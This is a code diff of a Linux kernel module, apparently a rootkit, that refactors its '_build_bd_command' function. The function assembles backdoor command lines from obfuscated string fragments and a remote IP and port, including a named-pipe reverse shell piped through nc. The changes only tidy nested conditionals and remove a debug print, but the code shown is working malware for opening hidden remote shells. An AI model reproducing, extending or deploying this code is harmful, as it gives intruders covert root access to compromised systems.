@@ -198,10 +198,8 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                         char ip[INET_ADDRSTRLEN+1] = {0};
                         snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
                         len = snprintf(NULL, 0, "%s %s:%s:%u,%s %s:\"%s%s\"", exe, a, ip, src_port, b, c, d, e);
-                        if (len) {
-                            if ((bd = kcalloc(1, ++len, GFP_KERNEL)))
-                                snprintf(bd, len, "%s %s:%s:%u,%s %s:\"%s%s\"", exe, a, ip, src_port, b, c, d, e);
-                        }
+                        if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
+                            snprintf(bd, len, "%s %s:%s:%u,%s %s:\"%s%s\"", exe, a, ip, src_port, b, c, d, e);
                     }
                     kv_mem_free(&a,&b,&c,&d,&e);
                 }
@@ -224,10 +222,8 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                         char ip[INET_ADDRSTRLEN+1] = {0};
                         snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
                         len = snprintf(NULL, 0, "%s %s:%s:%u,%s %s:%s", exe, a, ip, src_port, b, c, d);
-                        if (len) {
-                            if ((bd = kcalloc(1, ++len, GFP_KERNEL)))
-                                snprintf(bd, len, "%s %s:%s:%u,%s %s:%s", exe, a, ip, src_port, b, c, d);
-                        }
+                        if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
+                            snprintf(bd, len, "%s %s:%s:%u,%s %s:%s", exe, a, ip, src_port, b, c, d);
                     }
                     kv_mem_free(&a,&b,&c,&d);
                 }
@@ -254,11 +250,9 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                         snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
                         len = snprintf(NULL, 0, "%s %s/%s; %s -i < %s/%s %s | %s %s %s:%u > %s/%s",
                                 a, b, c, d, b, c, e, exe, f, ip, src_port, b, c);
-                        if (len) {
-                            if ((bd = kcalloc(1, ++len, GFP_KERNEL)))
-                                snprintf(bd, len, "%s %s/%s; %s -i < %s/%s %s | %s %s %s:%u > %s/%s",
-                                        a, b, c, d, b, c, e, exe, f, ip, src_port, b, c);
-                        }
+                        if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
+                            snprintf(bd, len, "%s %s/%s; %s -i < %s/%s %s | %s %s %s:%u > %s/%s",
+                                    a, b, c, d, b, c, e, exe, f, ip, src_port, b, c);
                     }
                     kv_mem_free(&a,&b,&c,&d,&e,&f);
                 }
@@ -279,11 +273,8 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                         char ip[INET_ADDRSTRLEN+1] = {0};
                         snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
                         len = snprintf(NULL, 0, "%s %s %s/%s/%u %s", a, b, c, ip, src_port, d);
-                        if (len) {
-                            if ((bd = kcalloc(1, ++len, GFP_KERNEL)))
-                                snprintf(bd, len, "%s %s %s/%s/%u %s", a, b, c, ip, src_port, d);
-                            prinfo("nc: %s\n", bd);
-                        }
+                        if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
+                            snprintf(bd, len, "%s %s %s/%s/%u %s", a, b, c, ip, src_port, d);
                     }
                     kv_mem_free(&a,&b,&c,&d);
                 }
